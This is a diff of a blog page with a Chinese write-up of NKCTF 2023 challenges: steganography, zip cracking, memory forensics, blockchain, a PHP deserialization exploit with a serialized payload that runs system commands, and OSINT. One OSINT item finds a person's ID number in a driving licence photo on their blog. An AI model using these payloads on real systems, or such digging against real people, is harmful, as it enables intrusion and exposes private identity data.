@@ -21,7 +21,7 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="dr0n">
-  <meta name="keywords" content="">
+  <meta name="keywords" content="ctf, writeups, web, misc">
   
     <meta name="description" content="rank：15  Mischard-miscbase32，公众号发NKCTF2023我来了！ blue先导入进vmware，开机发现是windows2008系统，用户带密码 挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符  复制一份cmd到放大镜  左下角启动放大镜功能后就启动了cmd，修改administrator密码  进入系统  easymusic根">
 <meta property="og:type" content="article">
@@ -82,9 +82,9 @@
 <meta property="article:published_time" content="2023-03-26T13:00:00.000Z">
 <meta property="article:modified_time" content="2025-07-27T10:04:21.727Z">
 <meta property="article:author" content="dr0n">
-<meta property="article:tag" content="wp">
 <meta property="article:tag" content="2023竞赛">
 <meta property="article:tag" content="nkctf">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://www.dr0n.top/img/wp/2023/2023nkctf-1.png">
   
@@ -128,7 +128,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9,"expand_all":true},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"openkounter":{"server_url":"https://openkounter-1lbvmren.edgeone.cool/","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -162,13 +162,11 @@
   
 
   
-    
-  
 
 
 
   
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -347,20 +345,13 @@
         
         
         
-          45 分钟
+          50 分钟
         
       </span>
     
 
     
     
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
       
     
   </div>
@@ -433,7 +424,7 @@
 <p>0宽得到key：<code>EnoOoO1G</code></p>
 <p>根据结尾的提示，密文rot47，key rot13</p>
 <p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p>
-<p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p>
+<p>在线rabbit得到<code>NKCTF{H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT}</code></p>
 <h2 id="misc-iot"><a href="#misc-iot" class="headerlink" title="misc?iot!"></a>misc?iot!</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/229321">参考文章</a></p>
 <p>选择<code>arm little-endian</code></p>
 <p>如果要写地址默认为<code>0x8000000</code></p>
@@ -444,7 +435,7 @@
 <p><img src="/img/wp/2023/2023nkctf-10.png" srcset="/img/loading.gif" lazyload></p>
 <p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p>
 <p><img src="/img/wp/2023/2023nkctf-11.png" srcset="/img/loading.gif" lazyload></p>
-<p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p>
+<p>在线rc4解密得到<code>NKCTF{H3l10_stm32}</code></p>
 <h2 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h2><p>根据注释中的提示爆破密码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure>
 
@@ -454,11 +445,11 @@
 <h2 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure>
 
-<p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p>
+<p>得到<code>NKCTF{3d77dc1a37b2d1ebf489c973f554ea10}</code></p>
 <h2 id="easy-bmp"><a href="#easy-bmp" class="headerlink" title="easy_bmp"></a>easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p>
 <p><img src="/img/wp/2023/2023nkctf-13.png" srcset="/img/loading.gif" lazyload></p>
 <p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p>
-<p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p>
+<p><code>NKCTF{eab1291e-9e37-4ff1-b76d-f1af63eaad43}</code></p>
 <h2 id="baby-music"><a href="#baby-music" class="headerlink" title="baby_music"></a>baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p>
 <p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p>
 <p>二进制转文件</p>
@@ -477,7 +468,7 @@
 <p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p>
 <p><img src="/img/wp/2023/2023nkctf-14.png" srcset="/img/loading.gif" lazyload></p>
 <p>解压得到flag</p>
-<p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p>
+<p><code>NKCTF{You_are_very_smart!!}</code></p>
 <h2 id="THMaster"><a href="#THMaster" class="headerlink" title="THMaster"></a>THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p>
 <p>ce修改分数到2亿多</p>
 <p><img src="/img/wp/2023/2023nkctf-15.png" srcset="/img/loading.gif" lazyload></p>
@@ -490,7 +481,7 @@
 <p>放大图片观察到很多像素点，提取然后拼接</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>img=img.resize((<span class="hljs-number">566</span>,<span class="hljs-number">566</span>),Image.NEAREST)<br>img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
-<p>得到flag<br><code>NKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;</code></p>
+<p>得到flag<br><code>NKCTF{49ce8740502743585c4a44404e62d8f9}</code></p>
 <h2 id="五年Misc，三年模拟"><a href="#五年Misc，三年模拟" class="headerlink" title="五年Misc，三年模拟"></a>五年Misc，三年模拟</h2><p><strong>赛后复现(套娃题)</strong></p>
 <p>压缩包注释<code>printf(&quot;%d%d%d%d%d%d&quot;,key[]);</code></p>
 <p>6位数字爆破，得到<code>114514</code></p>
@@ -518,7 +509,7 @@
 <p>拿这个密码去跑<code>cloacked-pixel</code>，得到下一层压缩包密码<code>f442212b3d398a8e</code></p>
 <p>根据提示是steghide爆破，那直接用stegseek跑了，得到下一层密码<code>764dc6c0361fc0fd</code></p>
 <p>看文件头，明显的F5隐写，得到下一层密码<code>un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26</code></p>
-<p>wav文件，一听就是sstv了，得到<code>NKCTF&#123;iLiKECTFbec@u5eDreaM!&#125;</code></p>
+<p>wav文件，一听就是sstv了，得到<code>NKCTF{iLiKECTFbec@u5eDreaM!}</code></p>
 <p><img src="/img/wp/2023/2023nkctf-20.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="baby-bitlocker"><a href="#baby-bitlocker" class="headerlink" title="baby_bitlocker"></a>baby_bitlocker</h2><p><strong>赛后复现</strong></p>
 <p>先做<code>2023.3.2</code></p>
@@ -532,14 +523,14 @@
 <p>且文档中的内容复制后与文档内不一样了</p>
 <p><img src="/img/wp/2023/2023nkctf-21.png" srcset="/img/loading.gif" lazyload></p>
 <p>odttf转ttf</p>
-<p>打开<code>/word/fontTable.xml</code>，得到<code>font-name</code>为<code>Byxs20_font</code>，<code>fontKey</code>为<code>&#123;F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A&#125;</code></p>
+<p>打开<code>/word/fontTable.xml</code>，得到<code>font-name</code>为<code>Byxs20_font</code>，<code>fontKey</code>为<code>{F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A}</code></p>
 <p>将<code>\word\fonts\font1.odttf</code>重命名为<code>F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf</code></p>
 <p>python转换</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 获取文件名</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 获取key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font1.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure>
 
 <p>fontforge识别</p>
 <p><img src="/img/wp/2023/2023nkctf-22.png" srcset="/img/loading.gif" lazyload></p>
-<p>得到一半flag：<code>nkctf&#123;ttf_is_funny_</code></p>
+<p>得到一半flag：<code>nkctf{ttf_is_funny_</code></p>
 <p>接着做<code>2023.3.4</code></p>
 <p>内存取证<br><code>python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE &quot;flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$&quot;</code></p>
 <p><img src="/img/wp/2023/2023nkctf-23.png" srcset="/img/loading.gif" lazyload></p>
@@ -548,7 +539,7 @@
 <p><img src="/img/wp/2023/2023nkctf-24.png" srcset="/img/loading.gif" lazyload></p>
 <p>用这个密钥恢复加密分区</p>
 <p><img src="/img/wp/2023/2023nkctf-25.png" srcset="/img/loading.gif" lazyload></p>
-<p>得到<code>bitlocker_is_very_interesting&#125;</code></p>
+<p>得到<code>bitlocker_is_very_interesting}</code></p>
 <p>最后看<code>2023.3.3</code></p>
 <p>hint：<code>flag2图片十分有规律的3x3，到底是来自几进制的秘密呢？</code></p>
 <p>根据提示<code>3x3</code>，猜测是4进制</p>
@@ -558,7 +549,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><br>img = cv2.imread(<span class="hljs-string">&quot;./flag2.png&quot;</span>,cv2.IMREAD_UNCHANGED)<br><br>r,c = img.shape<br><br><span class="hljs-comment">#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]</span><br>flag2_xy = [(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)]<br><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r,<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,c,<span class="hljs-number">3</span>):<br>        roi_img = img[y: y+<span class="hljs-number">3</span>, x: x+<span class="hljs-number">3</span>]<br><br>        <span class="hljs-comment">#for i in flag_xy:</span><br>        <span class="hljs-comment">#    print(chr(roi_img[i[::-1]]),end=&quot;&quot;)</span><br><br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag2_xy:<br>            tmp += <span class="hljs-built_in">str</span>(roi_img[i[::-<span class="hljs-number">1</span>]])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">4</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p>得到<code>flag2 is here: images_are_fun_</code></p>
-<p>三段flag拼接起来<code>NKCTF&#123;TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING&#125;</code></p>
+<p>三段flag拼接起来<code>NKCTF{TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING}</code></p>
 <h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p>
 <p><img src="/img/wp/2023/2023nkctf-27.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p>
@@ -577,14 +568,14 @@
 <p><img src="/img/wp/2023/2023nkctf-30.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="decompile-revenge"><a href="#decompile-revenge" class="headerlink" title="decompile_revenge"></a>decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p>
 <p><img src="/img/wp/2023/2023nkctf-31.png" srcset="/img/loading.gif" lazyload></p>
-<p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p>
+<p><code>NKCTF{This_1s_Decompile_Rev3nge!!!!}</code></p>
 <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>反序列化</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p>
 <p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p>
 <p>列目录：<code>dir /</code></p>
-<p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p>
+<p><code>O:7:&quot;Welcome&quot;:2:{s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:{s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:{s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;}}}</code></p>
 <p><img src="/img/wp/2023/2023nkctf-32.png" srcset="/img/loading.gif" lazyload></p>
 <p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p>
 <p>payload</p>
@@ -645,28 +636,28 @@
 <p>url编码后上传</p>
 <h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p>
 <p><img src="/img/wp/2023/2023nkctf-40.png" srcset="/img/loading.gif" lazyload></p>
-<p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p>
+<p><code>NKCTF{海南省海口市龙华区世纪公园}</code></p>
 <h2 id="两个人的夜晚"><a href="#两个人的夜晚" class="headerlink" title="两个人的夜晚"></a>两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p>
-<p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p>
+<p><code>NKCTF{天津市西青区中北镇万卉路3号NCC新城市中心}</code></p>
 <h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p>
 <p><img src="/img/wp/2023/2023nkctf-41.png" srcset="/img/loading.gif" lazyload></p>
-<p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p>
+<p><code>NKCTF{广东省江门市蓬江区莲平路}</code></p>
 <h2 id="real-social-engineering"><a href="#real-social-engineering" class="headerlink" title="real-social-engineering"></a>real-social-engineering</h2><p>github搜他id，找到博客地址：<a target="_blank" rel="noopener" href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p>
 <p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p>
-<p><code>NKCTF&#123;6107**********4710&#125;</code></p>
+<p><code>NKCTF{6107**********4710}</code></p>
 <h2 id="Ferris-Wheel"><a href="#Ferris-Wheel" class="headerlink" title="Ferris_Wheel"></a>Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p>
 <p><img src="/img/wp/2023/2023nkctf-42.png" srcset="/img/loading.gif" lazyload></p>
 <p>百度地图找到渝西之眼，组合爆破下地名</p>
-<p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p>
+<p><code>NKCTF{重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮}</code></p>
